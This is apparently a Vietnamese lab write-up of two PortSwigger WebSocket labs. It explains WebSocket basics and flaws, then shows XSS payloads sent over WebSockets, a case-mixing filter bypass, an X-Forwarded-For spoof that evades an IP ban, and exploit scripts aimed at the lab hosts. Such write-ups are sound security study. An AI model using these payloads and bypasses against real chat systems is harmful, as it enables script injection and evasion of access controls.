# WebSockets

- **Khái niệm**
  - WebSockets là giao thức truyền thông song công hoàn toàn, hai chiều được khởi tạo qua HTTP. Chúng thường được sử dụng trong các ứng dụng web hiện đại để truyền dữ liệu và lưu lượng truy cập không đồng bộ khác.
  - WebSockets hỗ trợ phương thức giao tiếp 2 chiều giữa client và server thông qua TCP (port 80 và 443). Theo phân tích từ http://websocket.org/quantum.html, WebSockets có thể giảm kích thước của HTTP header lên đến 500 – 1000 lần, giảm độ trễ của network lên đến 3 lần. Do đó, hỗ trợ tốt hơn đối với các ứng dụng web apps real – time.

![image](https://hackmd.io/_uploads/SJL2VytcT.png)

- WebSocket là một giao thức giúp truyền dữ liệu hai chiều giữa server-client qua một kết nối TCP duy nhất. Hơn nữa, webSocket là một giao thức được thiết kế để truyền dữ liệu bằng cách sử dụng cổng 80 và cổng 443 và nó là một phần của HTML5. Vì vậy, webSockets có thể hoạt động trên các cổng web tiêu chuẩn, nên không có rắc rối về việc mở cổng cho các ứng dụng, lo lắng về việc bị chặn bởi các tường lửa hay proxy server
- Không giống với giao thức HTTP là cần client chủ động gửi yêu cầu cho server, client sẽ chời đợi để nhận được dữ liệu từ máy chủ. Hay nói cách khác với giao thức Websocket thì server có thể chủ động gửi thông tin đến client mà không cần phải có yêu cầu từ client.
- Cấu trúc: hỗ trợ chuẩn giao thức mới: ws:// cho chuẩn thông thường và wss:// cho chuẩn secure (tương tự http:// và https://)

- **Lỗ hổng bảo mật WebSockets**
  - Dữ liệu đầu vào do người dùng cung cấp được truyền tới máy chủ có thể được xử lý theo những cách không an toàn, dẫn đến các lỗ hổng như chèn SQL hoặc chèn thực thể bên ngoài XML.
  - Một số lỗ hổng ẩn đạt được thông qua WebSockets chỉ có thể được phát hiện bằng kỹ thuật ngoài băng tần (OAST) .
  - Nếu dữ liệu do kẻ tấn công kiểm soát được truyền qua WebSockets tới những người dùng ứng dụng khác thì điều đó có thể dẫn đến XSS hoặc các lỗ hổng phía máy khách khác.

Phần lớn các lỗ hổng dựa trên đầu vào ảnh hưởng đến WebSockets có thể được tìm thấy và khai thác bằng cách giả mạo nội dung của tin nhắn WebSocket .

![image](https://hackmd.io/_uploads/ByTEDCdca.png)

- Thực hiện các hành động trái phép giả dạng người dùng nạn nhân. Giống như CSRF thông thường, kẻ tấn công có thể gửi tin nhắn tùy ý đến ứng dụng phía máy chủ. Nếu ứng dụng sử dụng thông báo WebSocket do khách hàng tạo để thực hiện bất kỳ hành động nhạy cảm nào thì kẻ tấn công có thể tạo thông báo phù hợp trên nhiều miền và kích hoạt những hành động đó.
- Truy xuất dữ liệu nhạy cảm mà người dùng có thể truy cập. Không giống như CSRF thông thường, việc chiếm quyền điều khiển WebSocket chéo trang cho phép kẻ tấn công tương tác hai chiều với ứng dụng dễ bị tấn công trên WebSocket bị tấn công. Nếu ứng dụng sử dụng tin nhắn WebSocket do máy chủ tạo để trả về bất kỳ dữ liệu nhạy cảm nào cho người dùng thì kẻ tấn công có thể chặn những tin nhắn đó và lấy được dữ liệu của người dùng nạn nhân.

## 1. Lab: Manipulating WebSocket messages to exploit vulnerabilities

link: https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities

### Đề bài

![image](https://hackmd.io/_uploads/SJMuP1Kqp.png)

### Phân tích

- Ứng dụng có chức năng Live Chat. Thử chat với nội dung bất kì

![image](https://hackmd.io/_uploads/SJHfO1Y56.png)

![image](https://hackmd.io/_uploads/rkI2tJYqT.png)

Các message sẽ được giao tiếp giữa client-server bằng web sockets.

![image](https://hackmd.io/_uploads/Bkpu_1Y5T.png)

CTRL+U thấy file .js

![image](https://hackmd.io/_uploads/rknqOyFc6.png)

file có nội dung

```javascript
(function () {
  var chatForm = document.getElementById("chatForm");
  var messageBox = document.getElementById("message-box");
  var webSocket = openWebSocket();

  messageBox.addEventListener("keydown", function (e) {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      sendMessage(new FormData(chatForm));
      chatForm.reset();
    }
  });

  chatForm.addEventListener("submit", function (e) {
    e.preventDefault();
    sendMessage(new FormData(this));
    this.reset();
  });

  function writeMessage(className, user, content) {
    var row = document.createElement("tr");
    row.className = className;

    var userCell = document.createElement("th");
    var contentCell = document.createElement("td");
    userCell.innerHTML = user;
    contentCell.innerHTML =
      typeof window.renderChatMessage === "function"
        ? window.renderChatMessage(content)
        : content;

    row.appendChild(userCell);
    row.appendChild(contentCell);
    document.getElementById("chat-area").appendChild(row);
  }

  function sendMessage(data) {
    var object = {};
    data.forEach(function (value, key) {
      object[key] = htmlEncode(value);
    });

    openWebSocket().then((ws) => ws.send(JSON.stringify(object)));
  }

  function htmlEncode(str) {
    if (chatForm.getAttribute("encode")) {
      return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
        var lookup = {
          "\\": "&#x5c;",
          "\r": "&#x0d;",
          "\n": "&#x0a;",
          '"': "&quot;",
          "<": "&lt;",
          ">": "&gt;",
          "'": "&#39;",
          "&": "&amp;",
        };
        return lookup[c];
      });
    }
    return str;
  }

  function openWebSocket() {
    return new Promise((res) => {
      if (webSocket) {
        res(webSocket);
        return;
      }

      let newWebSocket = new WebSocket(chatForm.getAttribute("action"));

      newWebSocket.onopen = function (evt) {
        writeMessage("system", "System:", "No chat history on record");
        newWebSocket.send("READY");
        res(newWebSocket);
      };

      newWebSocket.onmessage = function (evt) {
        var message = evt.data;

        if (message === "TYPING") {
          writeMessage("typing", "", "[typing...]");
        } else {
          var messageJson = JSON.parse(message);
          if (messageJson && messageJson["user"] !== "CONNECTED") {
            Array.from(document.getElementsByClassName("system")).forEach(
              function (element) {
                element.parentNode.removeChild(element);
              }
            );
          }
          Array.from(document.getElementsByClassName("typing")).forEach(
            function (element) {
              element.parentNode.removeChild(element);
            }
          );

          if (messageJson["user"] && messageJson["content"]) {
            writeMessage(
              "message",
              messageJson["user"] + ":",
              messageJson["content"]
            );
          } else if (messageJson["error"]) {
            writeMessage("message", "Error:", messageJson["error"]);
          }
        }
      };

      newWebSocket.onclose = function (evt) {
        webSocket = undefined;
        writeMessage("message", "System:", "--- Disconnected ---");
      };
    });
  }
})();
```

Kiểm tra cách message được render trong tag `<td>`

![image](https://hackmd.io/_uploads/S13VtJYca.png)

### Khai thác

- Gửi message với XSS payload `<img src=1 onerror=alert(1)>`

![image](https://hackmd.io/_uploads/HyHSjkYqp.png)

và thấy 1 hình ảnh đã được chèn vào

![image](https://hackmd.io/_uploads/Hyf2okY5a.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/HyL5iytqp.png)

mình đã viết lại script khai thác

```javascript
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    <script>
      const socket = new WebSocket(
        "wss://0a7600b303ef21c780ad0ddd003a0074.web-security-academy.net/chat"
      );

      socket.addEventListener("open", (event) => {
        console.log("Đã kết nối thành công");

        // Gửi dữ liệu
        const data = {
          message: "<img src=1 onerror='alert(1)'>",
        };

        socket.send(JSON.stringify(data));
      });

      socket.addEventListener("message", (event) => {
        console.log(`Nhận dữ liệu từ server: ${event.data}`);
      });

      socket.addEventListener("close", (event) => {
        console.log("Kết nối đã đóng");
      });
    </script>
  </body>
</html>
```

**mình đã thực hiện:**

- Kết nối WebSocket:

```javascript
const socket = new WebSocket(
  "wss://0a7600b303ef21c780ad0ddd003a0074.web-security-academy.net/chat"
);
```

Tạo một đối tượng WebSocket và kết nối đến địa chỉ WebSocket server `'wss://0a7600b303ef21c780ad0ddd003a0074.web-security-academy.net/chat'`.

- Sự kiện khi kết nối mở:

```javascript
socket.addEventListener("open", (event) => {
  // ...
});
```

Sự kiện này được kích hoạt khi kết nối WebSocket được mở thành công. Trong nó, bạn có thể thực hiện các hành động sau khi kết nối.

- Gửi dữ liệu:

```javascript
const data = {
  message: "<img src=1 onerror='alert(1)'>",
};
socket.send(JSON.stringify(data));
```

Tạo một đối tượng dữ liệu data với thuộc tính message chứa chuỗi JSON `"<img src=1 onerror='alert(1)'>"`. Sau đó, sử dụng JSON.stringify(data) để chuyển đối tượng JSON thành chuỗi và gửi nó qua kết nối WebSocket bằng socket.send().

- Sự kiện khi nhận dữ liệu từ server:

```javascript
socket.addEventListener("message", (event) => {
  // ...
});
```

Sự kiện này được kích hoạt khi dữ liệu được nhận từ server thông qua kết nối WebSocket. Trong nó, bạn có thể xử lý dữ liệu nhận được.

- Sự kiện khi kết nối đóng:

```javascript
socket.addEventListener("close", (event) => {
  // ...
});
```

Sự kiện này được kích hoạt khi kết nối WebSocket được đóng. Trong nó, bạn có thể thực hiện các hành động sau khi kết nối đã đóng.

![image](https://hackmd.io/_uploads/BJ1EXeY5a.png)

![image](https://hackmd.io/_uploads/BJxDVeY5p.png)

## 2. Lab: Manipulating the WebSocket handshake to exploit vulnerabilities

link: https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities

### Đề bài

![image](https://hackmd.io/_uploads/HyW6SmFca.png)

### Phân tích

- bài này có tính năng trò chuyện trực tiếp được triển khai bằng WebSockets .Nó có bộ lọc XSS nhưng thiếu sót. Để giải quyết bài lab mình sử dụng thông báo WebSocket để kích hoạt alert()cửa sổ bật lên trong trình duyệt của nhân viên hỗ trợ.

- `X-Forwarded-For` là một tiêu đề HTTP mà các máy chủ web sử dụng để xác định địa chỉ IP của máy khách gốc khi máy chủ web đó được cấu hình để chạy qua một hoặc nhiều máy chủ proxy hoặc load balancer. Tiêu đề này chứa danh sách các địa chỉ IP của các máy chủ proxy hoặc load balancer mà yêu cầu đã đi qua trước khi đến máy chủ web.
- Khi một máy chủ proxy hoặc load balancer chuyển tiếp yêu cầu từ máy khách đến máy chủ, nó có thể thêm tiêu đề X-Forwarded-For để giữ lại thông tin về địa chỉ IP của máy khách ban đầu. Điều này giúp máy chủ web biết được địa chỉ IP thực sự của máy khách, đặc biệt hữu ích khi có nhiều máy chủ proxy hoặc load balancer ở giữa.

- Ứng dụng có chức năng Live chat.

![image](https://hackmd.io/_uploads/rJFEwXF96.png)

![image](https://hackmd.io/_uploads/HkrIPQtca.png)

dữ liệu vẫn có trong thẻ `<td></td>`

- Gửi payload tương tự lab 1 thì đã bị filter.

![image](https://hackmd.io/_uploads/HknqwXKca.png)

Và sau đó mình cũng đã bị block IP.
Nhấp vào "Kết nối lại" và quan sát rằng nỗ lực kết nối không thành công vì địa chỉ IP của mình đã bị cấm.

![image](https://hackmd.io/_uploads/BJCx_Xtqa.png)

![image](https://hackmd.io/_uploads/HJWwzVF56.png)

mình địc source code của file này được

```javascript
(function () {
  var chatForm = document.getElementById("chatForm");
  var messageBox = document.getElementById("message-box");
  var webSocket = openWebSocket();

  messageBox.addEventListener("keydown", function (e) {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      sendMessage(new FormData(chatForm));
      chatForm.reset();
    }
  });

  chatForm.addEventListener("submit", function (e) {
    e.preventDefault();
    sendMessage(new FormData(this));
    this.reset();
  });

  function writeMessage(className, user, content) {
    var row = document.createElement("tr");
    row.className = className;

    var userCell = document.createElement("th");
    var contentCell = document.createElement("td");
    userCell.innerHTML = user;
    contentCell.innerHTML =
      typeof window.renderChatMessage === "function"
        ? window.renderChatMessage(content)
        : content;

    row.appendChild(userCell);
    row.appendChild(contentCell);
    document.getElementById("chat-area").appendChild(row);
  }

  function sendMessage(data) {
    var object = {};
    data.forEach(function (value, key) {
      object[key] = htmlEncode(value);
    });

    openWebSocket().then((ws) => ws.send(JSON.stringify(object)));
  }

  function htmlEncode(str) {
    if (chatForm.getAttribute("encode")) {
      return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
        var lookup = {
          "\\": "&#x5c;",
          "\r": "&#x0d;",
          "\n": "&#x0a;",
          '"': "&quot;",
          "<": "&lt;",
          ">": "&gt;",
          "'": "&#39;",
          "&": "&amp;",
        };
        return lookup[c];
      });
    }
    return str;
  }

  function openWebSocket() {
    return new Promise((res) => {
      if (webSocket) {
        res(webSocket);
        return;
      }

      let newWebSocket = new WebSocket(chatForm.getAttribute("action"));

      newWebSocket.onopen = function (evt) {
        writeMessage("system", "System:", "No chat history on record");
        newWebSocket.send("READY");
        res(newWebSocket);
      };

      newWebSocket.onmessage = function (evt) {
        var message = evt.data;

        if (message === "TYPING") {
          writeMessage("typing", "", "[typing...]");
        } else {
          var messageJson = JSON.parse(message);
          if (messageJson && messageJson["user"] !== "CONNECTED") {
            Array.from(document.getElementsByClassName("system")).forEach(
              function (element) {
                element.parentNode.removeChild(element);
              }
            );
          }
          Array.from(document.getElementsByClassName("typing")).forEach(
            function (element) {
              element.parentNode.removeChild(element);
            }
          );

          if (messageJson["user"] && messageJson["content"]) {
            writeMessage(
              "message",
              messageJson["user"] + ":",
              messageJson["content"]
            );
          } else if (messageJson["error"]) {
            writeMessage("message", "Error:", messageJson["error"]);
          }
        }
      };

      newWebSocket.onclose = function (evt) {
        webSocket = undefined;
        writeMessage("message", "System:", "--- Disconnected ---");
      };
    });
  }
})();
```

- Thêm header `X-Forwarded-For: 127.0.0.1` để bypass IP block.

![image](https://hackmd.io/_uploads/HJMI_7t56.png)

Kết nối lại thành công.

### Khai thác

- Làm lại các bước trên với payload XSS khác. Thực hiện xáo chộn chữ hoa chữ thường

```javascript
<img src=1 oNeRrOr=alert`1`>
```

![image](https://hackmd.io/_uploads/SkPDC7tqT.png)

![image](https://hackmd.io/_uploads/SJPfRQK96.png)

thành công và ta solve được challenge.

![image](https://hackmd.io/_uploads/rkhz0mFc6.png)

mình đã viết lại script khai thác

```javascript
<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Document</title>
 </head>
 <body>
   <script>
     const socket = new WebSocket(
       "wss://0a3200b404b9c5af82960bfd002a00ac.web-security-academy.net/chat"
     );

     socket.addEventListener("open", (event) => {
       console.log("Đã kết nối thành công");

       // Gửi dữ liệu
       const data = {
         message: "<img src=1 oNeRrOr=alert`1`>",
       };

       socket.send(JSON.stringify(data));
     });

     socket.addEventListener("message", (event) => {
       console.log(`Nhận dữ liệu từ server: ${event.data}`);
     });

     socket.addEventListener("close", (event) => {
       console.log("Kết nối đã đóng");
     });
   </script>
 </body>
</html>
```

![image](https://hackmd.io/_uploads/BJQUXEt9a.png)

![image](https://hackmd.io/_uploads/ByvYmNK56.png)
